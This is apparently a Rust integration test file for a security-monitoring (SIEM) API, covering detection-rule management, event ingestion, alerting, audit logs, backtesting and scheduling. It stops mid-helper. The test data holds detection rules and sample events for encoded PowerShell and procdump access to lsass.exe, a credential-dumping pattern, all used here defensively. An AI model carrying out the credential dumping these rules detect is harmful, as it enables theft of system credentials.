use std::sync::OnceLock;

use axum::http::{Request, StatusCode};
use cyberbox_api::{build_router, install_metrics_exporter, state::AppState};
use serde_json::{json, Value};
use tower::ServiceExt;

static METRICS: OnceLock<metrics_exporter_prometheus::PrometheusHandle> = OnceLock::new();

fn test_router() -> axum::Router {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics exporter must initialize"))
        .clone();

    build_router(AppState::new(handle))
}

fn auth_request(builder: http::request::Builder) -> http::request::Builder {
    builder
        .header("content-type", "application/json")
        .header("x-tenant-id", "tenant-a")
        .header("x-user-id", "soc-admin")
        .header("x-roles", "admin,analyst,viewer,ingestor")
}

#[tokio::test]
async fn healthz_returns_ok() {
    let app = test_router();

    let req = Request::builder()
        .uri("/healthz")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("request should build");

    let response = app
        .oneshot(req)
        .await
        .expect("response should be available");
    assert_eq!(response.status(), StatusCode::OK);
}

#[tokio::test]
async fn create_rule_and_list_rules() {
    let app = test_router();

    let create = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: test\ndetection:\n  selection:\n    - powershell\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "high",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create request should build");

    let create_response = app
        .clone()
        .oneshot(create)
        .await
        .expect("create response should be available");
    assert_eq!(create_response.status(), StatusCode::OK);

    let list = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("list request should build");

    let list_response = app
        .oneshot(list)
        .await
        .expect("list response should be available");
    assert_eq!(list_response.status(), StatusCode::OK);
}

#[tokio::test]
async fn update_and_delete_rule() {
    let app = test_router();

    let create = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: to-update\ndetection:\n  selection:\n    - whoami\n  condition: selection",
                "schedule_or_stream": "scheduled",
                "schedule": {
                    "interval_seconds": 30,
                    "lookback_seconds": 60
                },
                "severity": "medium",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create request should build");

    let create_response = app
        .clone()
        .oneshot(create)
        .await
        .expect("create response should be available");
    assert_eq!(create_response.status(), StatusCode::OK);

    let create_body = axum::body::to_bytes(create_response.into_body(), 1024 * 1024)
        .await
        .expect("create body should decode");
    let created: Value = serde_json::from_slice(&create_body).expect("create json should parse");
    let rule_id = created["rule_id"]
        .as_str()
        .expect("rule id should be present");

    let update = auth_request(Request::builder())
        .uri(format!("/api/v1/rules/{rule_id}"))
        .method("PATCH")
        .body(axum::body::Body::from(
            json!({
                "enabled": false,
                "schedule": {
                    "interval_seconds": 20,
                    "lookback_seconds": 45
                }
            })
            .to_string(),
        ))
        .expect("update request should build");
    let update_response = app
        .clone()
        .oneshot(update)
        .await
        .expect("update response should be available");
    assert_eq!(update_response.status(), StatusCode::OK);

    let update_body = axum::body::to_bytes(update_response.into_body(), 1024 * 1024)
        .await
        .expect("update body should decode");
    let updated: Value = serde_json::from_slice(&update_body).expect("update json should parse");
    assert_eq!(updated["enabled"], Value::Bool(false));
    assert_eq!(updated["schedule"]["interval_seconds"], Value::from(20));

    let delete = auth_request(Request::builder())
        .uri(format!("/api/v1/rules/{rule_id}"))
        .method("DELETE")
        .body(axum::body::Body::empty())
        .expect("delete request should build");
    let delete_response = app
        .clone()
        .oneshot(delete)
        .await
        .expect("delete response should be available");
    assert_eq!(delete_response.status(), StatusCode::OK);

    let list = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("list request should build");
    let list_response = app
        .oneshot(list)
        .await
        .expect("list response should be available");
    let list_body = axum::body::to_bytes(list_response.into_body(), 1024 * 1024)
        .await
        .expect("list body should decode");
    let listed: Value = serde_json::from_slice(&list_body).expect("list json should parse");
    let contains = listed
        .as_array()
        .expect("rules list should be array")
        .iter()
        .any(|rule| rule.get("rule_id").and_then(Value::as_str) == Some(rule_id));
    assert!(!contains, "rule should be deleted from list");
}

#[tokio::test]
async fn ingest_event_generates_alert_for_matching_rule() {
    let app = test_router();

    let create_rule_request = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: suspicious ps\ndetection:\n  selection:\n    - powershell\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "critical",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create rule request should build");

    let create_response = app
        .clone()
        .oneshot(create_rule_request)
        .await
        .expect("create rule response should exist");
    assert_eq!(create_response.status(), StatusCode::OK);

    let ingest = auth_request(Request::builder())
        .uri("/api/v1/events:ingest")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "events": [
                    {
                        "tenant_id": "tenant-a",
                        "source": "windows_sysmon",
                        "event_time": "2026-01-01T00:00:00Z",
                        "raw_payload": {
                            "cmdline": "powershell -enc AAECAwQ="
                        }
                    }
                ]
            })
            .to_string(),
        ))
        .expect("ingest request should build");

    let ingest_response = app
        .clone()
        .oneshot(ingest)
        .await
        .expect("ingest response should be available");
    assert_eq!(ingest_response.status(), StatusCode::OK);

    let list_alerts = auth_request(Request::builder())
        .uri("/api/v1/alerts")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("alert request should build");

    let alert_response = app
        .oneshot(list_alerts)
        .await
        .expect("alerts response should be available");
    assert_eq!(alert_response.status(), StatusCode::OK);

    let body = axum::body::to_bytes(alert_response.into_body(), 1024 * 1024)
        .await
        .expect("body should decode");
    let parsed: Value = serde_json::from_slice(&body).expect("json should parse");
    assert!(!parsed["alerts"]
        .as_array()
        .expect("alerts should be array")
        .is_empty());
}

#[tokio::test]
async fn sysmon_event_type_normalization_triggers_rule() {
    // Verifies the full pipeline: ingest Sysmon event with EventID →
    // normalization derives event_type → field-based Sigma rule matches → alert fires.
    let app = test_router();

    // Create a rule that requires event_type + field match (like bundled rules)
    let create_rule = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": concat!(
                    "title: LSASS Access Test\n",
                    "detection:\n",
                    "  selection:\n",
                    "    event_type: ProcessAccess\n",
                    "    TargetImage|endswith: '\\lsass.exe'\n",
                    "  condition: selection\n"
                ),
                "schedule_or_stream": "stream",
                "severity": "critical",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("request");
    let resp = app.clone().oneshot(create_rule).await.expect("response");
    assert_eq!(resp.status(), StatusCode::OK);

    // Ingest a Sysmon EventID 10 (ProcessAccess) event — normalization
    // should derive event_type = "ProcessAccess"
    let ingest = auth_request(Request::builder())
        .uri("/api/v1/events:ingest")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "events": [{
                    "tenant_id": "tenant-a",
                    "source": "windows_sysmon",
                    "event_time": "2026-06-01T00:00:00Z",
                    "raw_payload": {
                        "EventID": 10,
                        "SourceImage": "C:\\procdump64.exe",
                        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                        "GrantedAccess": "0x1010"
                    }
                }]
            })
            .to_string(),
        ))
        .expect("request");
    let resp = app.clone().oneshot(ingest).await.expect("response");
    assert_eq!(resp.status(), StatusCode::OK);

    // Check that an alert was generated
    let list = auth_request(Request::builder())
        .uri("/api/v1/alerts")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("request");
    let resp = app.oneshot(list).await.expect("response");
    assert_eq!(resp.status(), StatusCode::OK);

    let body = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let parsed: Value = serde_json::from_slice(&body).expect("json");
    let alerts = parsed["alerts"].as_array().expect("alerts array");
    assert!(
        alerts
            .iter()
            .any(|a| a["rule_title"].as_str().unwrap_or("").contains("LSASS")),
        "Expected LSASS alert but got: {alerts:?}"
    );
}

#[tokio::test]
async fn list_audit_logs_returns_rule_mutation_entries() {
    let app = test_router();

    let create = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: auditable\ndetection:\n  selection:\n    - powershell\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "high",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create request should build");
    let create_response = app
        .clone()
        .oneshot(create)
        .await
        .expect("create response should be available");
    assert_eq!(create_response.status(), StatusCode::OK);

    let list = auth_request(Request::builder())
        .uri("/api/v1/audit-logs?limit=25")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("audit list request should build");
    let list_response = app
        .oneshot(list)
        .await
        .expect("audit list response should be available");
    assert_eq!(list_response.status(), StatusCode::OK);

    let body = axum::body::to_bytes(list_response.into_body(), 1024 * 1024)
        .await
        .expect("audit body should decode");
    let parsed: Value = serde_json::from_slice(&body).expect("audit json should parse");
    let entries = parsed["entries"]
        .as_array()
        .expect("audit entries should be array");
    assert!(!entries.is_empty(), "audit list should have entries");

    let has_rule_create = entries.iter().any(|entry| {
        entry.get("action").and_then(Value::as_str) == Some("rule.create")
            && entry.get("actor").and_then(Value::as_str) == Some("soc-admin")
            && entry.get("entity_type").and_then(Value::as_str) == Some("rule")
    });
    assert!(has_rule_create, "expected rule.create audit entry");
}

#[tokio::test]
async fn operator_flow_produces_alert_actions_and_audit_entries() {
    let app = test_router();

    let create_rule_request = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: operator-flow\ndetection:\n  selection:\n    - powershell\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "critical",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create rule request should build");
    let create_rule_response = app
        .clone()
        .oneshot(create_rule_request)
        .await
        .expect("create rule response should be available");
    assert_eq!(create_rule_response.status(), StatusCode::OK);

    let ingest = auth_request(Request::builder())
        .uri("/api/v1/events:ingest")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "events": [
                    {
                        "tenant_id": "tenant-a",
                        "source": "windows_sysmon",
                        "event_time": "2026-01-01T00:00:00Z",
                        "raw_payload": {
                            "cmdline": "powershell -enc operator-flow"
                        }
                    }
                ]
            })
            .to_string(),
        ))
        .expect("ingest request should build");
    let ingest_response = app
        .clone()
        .oneshot(ingest)
        .await
        .expect("ingest response should be available");
    assert_eq!(ingest_response.status(), StatusCode::OK);

    let list_alerts = auth_request(Request::builder())
        .uri("/api/v1/alerts")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("list alerts request should build");
    let list_alerts_response = app
        .clone()
        .oneshot(list_alerts)
        .await
        .expect("list alerts response should be available");
    assert_eq!(list_alerts_response.status(), StatusCode::OK);
    let list_alerts_body = axum::body::to_bytes(list_alerts_response.into_body(), 1024 * 1024)
        .await
        .expect("list alerts body should decode");
    let alerts_json: Value =
        serde_json::from_slice(&list_alerts_body).expect("alerts json should parse");
    let alert_id = alerts_json["alerts"]
        .as_array()
        .and_then(|entries| entries.first())
        .and_then(|entry| entry.get("alert_id"))
        .and_then(Value::as_str)
        .expect("alert_id should be present after ingest");

    let assign = auth_request(Request::builder())
        .uri(format!("/api/v1/alerts/{alert_id}:assign"))
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "actor": "soc-admin",
                "assignee": "tier1-analyst"
            })
            .to_string(),
        ))
        .expect("assign request should build");
    let assign_response = app
        .clone()
        .oneshot(assign)
        .await
        .expect("assign response should be available");
    assert_eq!(assign_response.status(), StatusCode::OK);

    let ack = auth_request(Request::builder())
        .uri(format!("/api/v1/alerts/{alert_id}:ack"))
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "actor": "soc-admin"
            })
            .to_string(),
        ))
        .expect("ack request should build");
    let ack_response = app
        .clone()
        .oneshot(ack)
        .await
        .expect("ack response should be available");
    assert_eq!(ack_response.status(), StatusCode::OK);

    let list_audits = auth_request(Request::builder())
        .uri("/api/v1/audit-logs?entity_type=alert&limit=50")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("list audits request should build");
    let list_audits_response = app
        .oneshot(list_audits)
        .await
        .expect("list audits response should be available");
    assert_eq!(list_audits_response.status(), StatusCode::OK);
    let list_audits_body = axum::body::to_bytes(list_audits_response.into_body(), 1024 * 1024)
        .await
        .expect("list audits body should decode");
    let audits_json: Value =
        serde_json::from_slice(&list_audits_body).expect("audits json should parse");
    let entries = audits_json["entries"]
        .as_array()
        .expect("audit entries should be present");

    let has_assign = entries.iter().any(|entry| {
        entry.get("action").and_then(Value::as_str) == Some("alert.assign")
            && entry.get("entity_id").and_then(Value::as_str) == Some(alert_id)
            && entry.get("before").is_some()
            && entry.get("after").is_some()
    });
    let has_ack = entries.iter().any(|entry| {
        entry.get("action").and_then(Value::as_str) == Some("alert.ack")
            && entry.get("entity_id").and_then(Value::as_str) == Some(alert_id)
            && entry.get("before").is_some()
            && entry.get("after").is_some()
    });

    assert!(
        has_assign,
        "expected alert.assign audit entry for operator flow"
    );
    assert!(has_ack, "expected alert.ack audit entry for operator flow");
}

#[tokio::test]
async fn list_audit_logs_supports_action_filter_and_cursor() {
    let app = test_router();

    for title in ["cursor-a", "cursor-b", "cursor-c"] {
        let create = auth_request(Request::builder())
            .uri("/api/v1/rules")
            .method("POST")
            .body(axum::body::Body::from(
                json!({
                    "sigma_source": format!("title: {title}\ndetection:\n  selection:\n    - powershell\n  condition: selection"),
                    "schedule_or_stream": "stream",
                    "severity": "medium",
                    "enabled": true
                })
                .to_string(),
            ))
            .expect("create request should build");
        let create_response = app
            .clone()
            .oneshot(create)
            .await
            .expect("create response should be available");
        assert_eq!(create_response.status(), StatusCode::OK);
    }

    let first_page = auth_request(Request::builder())
        .uri("/api/v1/audit-logs?action=rule.create&limit=2")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("first page request should build");
    let first_page_response = app
        .clone()
        .oneshot(first_page)
        .await
        .expect("first page response should be available");
    assert_eq!(first_page_response.status(), StatusCode::OK);
    let first_page_body = axum::body::to_bytes(first_page_response.into_body(), 1024 * 1024)
        .await
        .expect("first page body should decode");
    let first_page_json: Value =
        serde_json::from_slice(&first_page_body).expect("first page json should parse");
    let first_entries = first_page_json["entries"]
        .as_array()
        .expect("first page entries should be array");
    assert_eq!(first_entries.len(), 2, "first page should obey limit");
    let first_cursor = first_page_json["next_cursor"]
        .as_str()
        .expect("next cursor should be present on first page");
    let encoded_cursor = first_cursor.replace('|', "%7C");

    let second_page = auth_request(Request::builder())
        .uri(format!(
            "/api/v1/audit-logs?action=rule.create&limit=2&cursor={encoded_cursor}"
        ))
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("second page request should build");
    let second_page_response = app
        .oneshot(second_page)
        .await
        .expect("second page response should be available");
    assert_eq!(second_page_response.status(), StatusCode::OK);
    let second_page_body = axum::body::to_bytes(second_page_response.into_body(), 1024 * 1024)
        .await
        .expect("second page body should decode");
    let second_page_json: Value =
        serde_json::from_slice(&second_page_body).expect("second page json should parse");
    let second_entries = second_page_json["entries"]
        .as_array()
        .expect("second page entries should be array");
    assert!(
        !second_entries.is_empty(),
        "second page should include older filtered entries"
    );
    assert!(second_entries
        .iter()
        .all(|entry| { entry.get("action").and_then(Value::as_str) == Some("rule.create") }));
}

#[tokio::test]
async fn alert_suppression_deduplicates_repeat_matches() {
    let app = test_router();

    let create_rule = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: suppress-test\ndetection:\n  selection:\n    - powershell\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "high",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("create rule request should build");
    let create_response = app
        .clone()
        .oneshot(create_rule)
        .await
        .expect("create rule response should be available");
    assert_eq!(create_response.status(), StatusCode::OK);

    let event_body = json!({
        "events": [{
            "tenant_id": "tenant-a",
            "source": "windows_sysmon",
            "event_time": "2026-01-01T00:00:00Z",
            "raw_payload": { "cmdline": "powershell -enc suppress-test" }
        }]
    })
    .to_string();

    for _ in 0..2 {
        let ingest = auth_request(Request::builder())
            .uri("/api/v1/events:ingest")
            .method("POST")
            .body(axum::body::Body::from(event_body.clone()))
            .expect("ingest request should build");
        let ingest_response = app
            .clone()
            .oneshot(ingest)
            .await
            .expect("ingest response should be available");
        assert_eq!(ingest_response.status(), StatusCode::OK);
    }

    let list_req = auth_request(Request::builder())
        .uri("/api/v1/alerts")
        .method("GET")
        .body(axum::body::Body::empty())
        .expect("list alerts request should build");
    let list_response = app
        .oneshot(list_req)
        .await
        .expect("list alerts response should be available");
    assert_eq!(list_response.status(), StatusCode::OK);
    let body = axum::body::to_bytes(list_response.into_body(), 1024 * 1024)
        .await
        .expect("body should decode");
    let page: Value = serde_json::from_slice(&body).expect("alerts json should parse");
    let alerts = page["alerts"].as_array().expect("alerts array");

    assert_eq!(
        alerts.len(),
        1,
        "two matches on same source+rule should produce exactly one alert, got {}: {alerts:?}",
        alerts.len()
    );
    assert_eq!(
        alerts[0]["hit_count"].as_u64(),
        Some(2),
        "hit_count should be 2 after two matches"
    );
}

#[tokio::test]
async fn alert_close_sets_resolution_and_audit_trail() {
    let app = test_router();

    // Create a rule and generate an alert.
    let create_rule = auth_request(Request::builder())
        .uri("/api/v1/rules")
        .method("POST")
        .body(axum::body::Body::from(
            json!({
                "sigma_source": "title: close-test\ndetection:\n  selection:\n    - closeme\n  condition: selection",
                "schedule_or_stream": "stream",
                "severity": "medium",
                "enabled": true
            })
            .to_string(),
        ))
        .expect("build");
    app.clone().oneshot(create_rule).await.expect("create rule");

    let ingest = auth_request(Request::builder())
        .uri("/api/v1/events:ingest")
        .method("POST")
        .body(axum::body::Body::from(
            json!({ "events": [{ "tenant_id": "tenant-a", "source": "syslog",
                "event_time": "2026-01-01T00:00:00Z",
                "raw_payload": { "msg": "closeme please" } }] })
            .to_string(),
        ))
        .expect("build");
    app.clone().oneshot(ingest).await.expect("ingest");

    // Fetch the alert id.
    let list_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/alerts")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("list alerts");
    let body = axum::body::to_bytes(list_resp.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let page: Value = serde_json::from_slice(&body).expect("json");
    let alerts = page["alerts"].as_array().expect("alerts array");
    assert!(!alerts.is_empty(), "alert must exist before close");
    let alert_id = alerts[0]["alert_id"].as_str().expect("alert_id");

    // Close the alert with false_positive resolution.
    let close_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri(format!("/api/v1/alerts/{alert_id}:close"))
                .method("POST")
                .body(axum::body::Body::from(
                    json!({ "actor": "soc-admin", "resolution": "false_positive",
                            "note": "noise from test env" })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("close response");
    assert_eq!(close_resp.status(), StatusCode::OK);

    let body = axum::body::to_bytes(close_resp.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let closed: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(
        closed["status"].as_str(),
        Some("closed"),
        "status must be closed"
    );
    assert_eq!(
        closed["resolution"].as_str(),
        Some("false_positive"),
        "resolution must be set"
    );
    assert_eq!(
        closed["close_note"].as_str(),
        Some("noise from test env"),
        "note must be stored"
    );

    // Verify audit log captures alert.close action.
    let audit_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/audit-logs?limit=5")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("audit response");
    let body = axum::body::to_bytes(audit_resp.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let audit: Value = serde_json::from_slice(&body).expect("json");
    let entries = audit["entries"].as_array().expect("entries");
    let close_entry = entries
        .iter()
        .find(|e| e["action"].as_str() == Some("alert.close"));
    assert!(close_entry.is_some(), "alert.close audit entry must exist");
}

// ─── Detection Engineering Endpoints ─────────────────────────────────────────

#[tokio::test]
async fn dry_run_returns_match_result_without_persisting() {
    let app = test_router();

    // Dry-run a rule that should match the sample event.
    let resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules/dry-run")
                .method("POST")
                .body(axum::body::Body::from(
                    json!({
                        "sigma_source": "title: DryRun\ndetection:\n  sel:\n    cmd|contains: malware\n  condition: sel",
                        "severity": "high",
                        "sample_event": { "cmd": "run malware.exe" }
                    })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let result: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(result["compile_result"].as_str(), Some("ok"));
    assert_eq!(result["matched"].as_bool(), Some(true));

    // No rule should have been saved.
    let rules_resp = app
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("response");
    let body = axum::body::to_bytes(rules_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let rules: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(
        rules.as_array().map(|v| v.len()).unwrap_or(0),
        0,
        "dry-run must not persist the rule"
    );
}

#[tokio::test]
async fn dry_run_returns_compile_error_for_invalid_sigma() {
    let app = test_router();

    let resp = app
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules/dry-run")
                .method("POST")
                .body(axum::body::Body::from(
                    json!({
                        "sigma_source": "this: is: not: valid: sigma",
                        "severity": "low",
                        "sample_event": {}
                    })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let result: Value = serde_json::from_slice(&body).expect("json");
    assert!(
        result["compile_result"]
            .as_str()
            .unwrap_or("")
            .starts_with("error:"),
        "invalid sigma must produce compile_result starting with 'error:'"
    );
    assert_eq!(result["matched"].as_bool(), Some(false));
}

#[tokio::test]
async fn backtest_returns_match_stats_for_ingested_events() {
    let app = test_router();

    // Create a rule that matches events with cmd=malware.
    let rule_body = json!({
        "sigma_source": "title: BacktestRule\ndetection:\n  sel:\n    cmd|contains: malware\n  condition: sel",
        "schedule_or_stream": "stream",
        "severity": "high",
        "enabled": true
    });
    let rule_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules")
                .method("POST")
                .body(axum::body::Body::from(rule_body.to_string()))
                .expect("build"),
        )
        .await
        .expect("response");
    let body = axum::body::to_bytes(rule_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let rule: Value = serde_json::from_slice(&body).expect("json");
    let rule_id = rule["rule_id"].as_str().expect("rule_id");

    // Ingest 2 matching events + 1 non-matching event.
    let ingest_body = json!({
        "events": [
            { "tenant_id": "tenant-a", "source": "agent_forwarded", "raw_payload": { "cmd": "run malware.exe" }, "event_time": "2026-01-15T10:00:00Z" },
            { "tenant_id": "tenant-a", "source": "agent_forwarded", "raw_payload": { "cmd": "start malware.sh" }, "event_time": "2026-01-15T10:01:00Z" },
            { "tenant_id": "tenant-a", "source": "agent_forwarded", "raw_payload": { "cmd": "ls -la" }, "event_time": "2026-01-15T10:02:00Z" }
        ]
    });
    app.clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/events:ingest")
                .method("POST")
                .body(axum::body::Body::from(ingest_body.to_string()))
                .expect("build"),
        )
        .await
        .expect("ingest response");

    // Backtest the rule over the event time range.
    let bt_resp = app
        .oneshot(
            auth_request(Request::builder())
                .uri(format!("/api/v1/rules/{rule_id}/backtest"))
                .method("POST")
                .body(axum::body::Body::from(
                    json!({
                        "from": "2026-01-15T00:00:00Z",
                        "to":   "2026-01-16T00:00:00Z"
                    })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("backtest response");
    assert_eq!(bt_resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(bt_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let bt: Value = serde_json::from_slice(&body).expect("json");

    assert_eq!(bt["total_events_scanned"].as_u64(), Some(3));
    assert_eq!(bt["matched_count"].as_u64(), Some(2));
    assert!(bt["match_rate_pct"].as_f64().unwrap_or(0.0) > 60.0);
    assert_eq!(bt["sample_event_ids"].as_array().map(|v| v.len()), Some(2));
}

#[tokio::test]
async fn coverage_report_reflects_rule_mitre_tags() {
    let app = test_router();

    // Initially coverage should have 0 covered techniques.
    let cov_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/coverage")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("response");
    let body = axum::body::to_bytes(cov_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let cov: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(cov["total_covered"].as_u64(), Some(0));
    assert!(
        cov["total_in_framework"].as_u64().unwrap_or(0) > 0,
        "framework count must be non-zero"
    );

    // Create a rule with MITRE tags.
    let rule_body = json!({
        "sigma_source": "title: PS\ntags:\n  - attack.t1059.001\ndetection:\n  sel:\n    cmd|contains: powershell\n  condition: sel",
        "schedule_or_stream": "stream",
        "severity": "high",
        "enabled": true
    });
    app.clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules")
                .method("POST")
                .body(axum::body::Body::from(rule_body.to_string()))
                .expect("build"),
        )
        .await
        .expect("response");

    // Coverage should now show T1059.001 as covered.
    let cov_resp2 = app
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/coverage")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("response");
    let body = axum::body::to_bytes(cov_resp2.into_body(), 64 * 1024)
        .await
        .expect("body");
    let cov2: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(cov2["total_covered"].as_u64(), Some(1));
    let techniques = cov2["covered_techniques"].as_array().expect("array");
    assert_eq!(techniques[0]["technique_id"].as_str(), Some("T1059.001"));
    assert!(cov2["coverage_pct"].as_f64().unwrap_or(0.0) > 0.0);
}

// ── Scheduler ────────────────────────────────────────────────────────────────

/// End-to-end test for scheduled rules:
/// 1. Create a scheduled detection rule.
/// 2. Ingest an event that matches it.
/// 3. Manually trigger `POST /api/v1/scheduler/tick`.
/// 4. Assert that the tick reports ≥1 alert emitted.
/// 5. Assert the alert appears in `GET /api/v1/alerts`.
#[tokio::test]
async fn scheduled_rule_fires_after_tick() {
    let app = test_router();

    // ── 1. Create a scheduled rule ────────────────────────────────────────────
    let sigma = "title: Scheduled PowerShell\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    cmd|contains: powershell\n  condition: selection";
    let create_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/rules")
                .method("POST")
                .body(axum::body::Body::from(
                    json!({
                        "sigma_source": sigma,
                        "schedule_or_stream": "scheduled",
                        "severity": "high",
                        "enabled": true,
                        "schedule": { "interval_seconds": 300, "lookback_seconds": 300 }
                    })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(create_resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(create_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let rule: Value = serde_json::from_slice(&body).expect("json");
    let rule_id = rule["rule_id"].as_str().expect("rule_id");

    // ── 2. Ingest a matching event ────────────────────────────────────────────
    let now = chrono::Utc::now().to_rfc3339();
    let ingest_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/events:ingest")
                .method("POST")
                .body(axum::body::Body::from(
                    json!({
                        "events": [{
                            "tenant_id": "tenant-a",
                            "source": "windows_sysmon",
                            "event_time": now,
                            "raw_payload": { "cmd": "powershell -enc dGVzdA==" }
                        }]
                    })
                    .to_string(),
                ))
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(ingest_resp.status(), StatusCode::OK);

    // ── 3. Trigger a scheduler tick ───────────────────────────────────────────
    let tick_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/scheduler/tick")
                .method("POST")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(tick_resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(tick_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let tick: Value = serde_json::from_slice(&body).expect("json");
    assert_eq!(tick["rules_scanned"].as_u64(), Some(1));
    assert!(
        tick["alerts_emitted"].as_u64().unwrap_or(0) >= 1,
        "expected at least one alert from scheduled rule, got tick={tick}"
    );

    // ── 4. Alert must appear in the alert list ────────────────────────────────
    let alerts_resp = app
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/alerts")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("response");
    assert_eq!(alerts_resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(alerts_resp.into_body(), 64 * 1024)
        .await
        .expect("body");
    let alerts_page: Value = serde_json::from_slice(&body).expect("json");
    let alerts_arr = alerts_page["alerts"].as_array().expect("array");
    assert!(
        !alerts_arr.is_empty(),
        "expected alerts after scheduled tick, got none"
    );
    assert_eq!(
        alerts_arr[0]["rule_id"].as_str(),
        Some(rule_id),
        "alert rule_id should match created rule"
    );
    assert_eq!(
        alerts_arr[0]["status"].as_str(),
        Some("open"),
        "alert should be open"
    );
}

// ── Agent fleet-management tests ──────────────────────────────────────────────

/// Helper: POST /api/v1/agents/register, return parsed JSON body.
async fn register_test_agent(app: axum::Router, agent_id: &str) -> Value {
    let req = auth_request(Request::builder())
